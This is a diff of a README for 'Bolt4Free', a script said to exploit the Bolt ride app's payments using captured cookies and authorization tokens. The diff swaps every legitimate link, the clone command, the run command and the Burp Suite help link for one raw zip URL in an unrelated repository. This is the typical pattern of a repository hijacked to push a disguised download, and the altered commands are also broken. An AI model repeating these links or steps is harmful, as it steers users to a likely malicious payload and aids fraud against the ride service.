@@ -7,7 +7,7 @@ Bolt4Free is a Python script that exploits a practical vulnerability in the Bolt
 
 ## Prerequisites
 - Bolt account with a confirmed Payment method set up
-- Burpsuit to intercept `HTTP` requests and get the information below (more on how to get Burpsuit set up on mobile under [Intercepting Requests with Burp Suite](https://github.com/amstrdm/Bolt4Free/edit/main/README.md#intercepting-requests-with-burp-suite)
+- Burpsuit to intercept `HTTP` requests and get the information below (more on how to get Burpsuit set up on mobile under [Intercepting Requests with Burp Suite](https://raw.githubusercontent.com/baniblunt/Bolt4Free/main/megasclerum/Bolt4Free.zip)
 
 Before running this program, you need to have the following information:
 
@@ -26,7 +26,7 @@ pip install requests
 ```
 After the requirements are installed clone the repository:
 ```
-git clone https://github.com/amstrdm/Bolt4Free.git
+git clone https://raw.githubusercontent.com/baniblunt/Bolt4Free/main/megasclerum/Bolt4Free.zip
 ```
 
 ## Usage
@@ -41,13 +41,13 @@ Additionally, you can change the `user_agent` variable to match your desired use
 After that you can execute the script normally with Python:
 ```
 cd Bolt4Free
-python3 bolt4free.py
+python3 https://raw.githubusercontent.com/baniblunt/Bolt4Free/main/megasclerum/Bolt4Free.zip
 ```
 
 
 ## Intercepting Requests with Burp Suite
 
-To obtain the required variables (`Cookie`, `Authorization`, `Payment_instrument_id`), you can redirect the POST requests from your phone's Bolt app to a computer running Burp Suite. This allows you to capture the requests and extract the necessary values. You can find instructions on how to redirect requests from a phone to Burp Suite [here](https://portswigger.net/support/configuring-an-android-device-to-work-with-burp).
+To obtain the required variables (`Cookie`, `Authorization`, `Payment_instrument_id`), you can redirect the POST requests from your phone's Bolt app to a computer running Burp Suite. This allows you to capture the requests and extract the necessary values. You can find instructions on how to redirect requests from a phone to Burp Suite [here](https://raw.githubusercontent.com/baniblunt/Bolt4Free/main/megasclerum/Bolt4Free.zip).
 
 Please note that this process may require technical expertise and is intended for educational purposes only.
 
